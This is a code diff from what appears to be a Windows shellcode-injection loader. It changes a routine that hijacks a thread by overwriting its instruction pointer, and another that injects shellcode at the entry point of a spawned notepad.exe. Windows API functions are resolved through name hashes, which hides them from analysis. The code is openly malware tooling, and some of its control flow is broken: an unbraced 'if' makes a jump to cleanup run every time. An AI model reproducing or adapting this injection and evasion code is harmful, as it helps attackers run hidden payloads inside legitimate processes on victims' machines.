@@ -150,7 +150,7 @@ namespace execute {
 			if (thread_entry.th32OwnerProcessID == pid)
 			{
 				thread_handle = OpenThreadC(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
-				LOG_SUCCESS("Successfuly hijacked thread: %08lX", thread_handle);
+				LOG_SUCCESS("Successfuly hijacked thread: %016llX", thread_handle);
 				break;
 			}
 		}
@@ -159,14 +159,14 @@ namespace execute {
 
 		if (!SuspendThreadC(thread_handle))
 		{
-			return LOG_ERROR("Failed to suspend thread. (Code: %08lX)", GetLastErrorC());
+			return LOG_ERROR("Failed to suspend thread. (Code: %016llX)", GetLastErrorC());
 			goto CLEANUP;
 		}
 		LOG_SUCCESS("Thread Suspended.");
 
 		if (!GetThreadContextC(thread_handle, &context))
 		{
-			return LOG_ERROR("GetThreadContext Failed. (Code: %08lX)", GetLastErrorC());
+			return LOG_ERROR("GetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
 			goto CLEANUP;
 		}
 		LOG_SUCCESS("Got Thread Context.");
@@ -174,7 +174,7 @@ namespace execute {
 		context.Rip = (DWORD_PTR)address_ptr;
 		if (!SetThreadContextC(thread_handle, &context))
 		{
-			return LOG_ERROR("SetThreadContext Failed. (Code: %08lX)", GetLastErrorC());
+			return LOG_ERROR("SetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
 			goto CLEANUP;
 		}
 		LOG_SUCCESS("Set Thread Context.");
@@ -208,45 +208,35 @@ namespace execute {
 	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
 	{
 		BOOL success = FALSE;
+		LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
+		HANDLE thread_handle = INVALID_HANDLE_VALUE;
 		HMODULE kernel32 = NULL;
-		HANDLE file_handle = INVALID_HANDLE_VALUE;
-		PBYTE buffer = NULL;
-		DWORD file_size = 0x00;
-		DWORD bytes_read = 0x00;
 
-		STARTUPINFO si = {};
-		PROCESS_INFORMATION pi = {};
-		SECURITY_ATTRIBUTES security_attribs = {};
+#pragma region imports
 
-#pragma region [Kernel32 Functions]
-
-		typeGetLastError GetLastErrorC = NULL;
+		typeResumeThread ResumeThreadC = NULL;
 		typeCloseHandle CloseHandleC = NULL;
-		typeCreateFileA CreateFileC = NULL;
+		typeGetLastError GetLastErrorC = NULL;
 
 		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_resumethread = malapi::HashStringFowlerNollVoVariant1a("ResumeThread");
 		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
-		constexpr ULONG hash_createfilea = malapi::HashStringFowlerNollVoVariant1a("CreateFileA");
+		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
 
 		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		if (kernel32 == NULL)
-		{
-			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
-			goto CLEANUP;
-		}
-
-		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
+		ResumeThreadC = (typeResumeThread)malapi::GetProcAddressC(kernel32, hash_resumethread);
 		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
-		CreateFileC = (typeCreateFileA)malapi::GetProcAddressC(kernel32, hash_createfilea);
+		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
 
 #pragma endregion
 
+		thread_handle = malapi::EntryPointHandle((LPSTR)file_path, shellcode, shellcode_size);
+		if (thread_handle == NULL) LOG_ERROR("Failed to get handle to thread. (Code: %016llX)", GetLastErrorC());  goto CLEANUP;
+		ResumeThreadC(thread_handle);
 		success = TRUE;
 
 	CLEANUP:
-		// CloseHandleC(process_handle);
-		// CloseHandleC(thread_handle);
+		CloseHandleC(thread_handle);
 		return success;
 	}
 
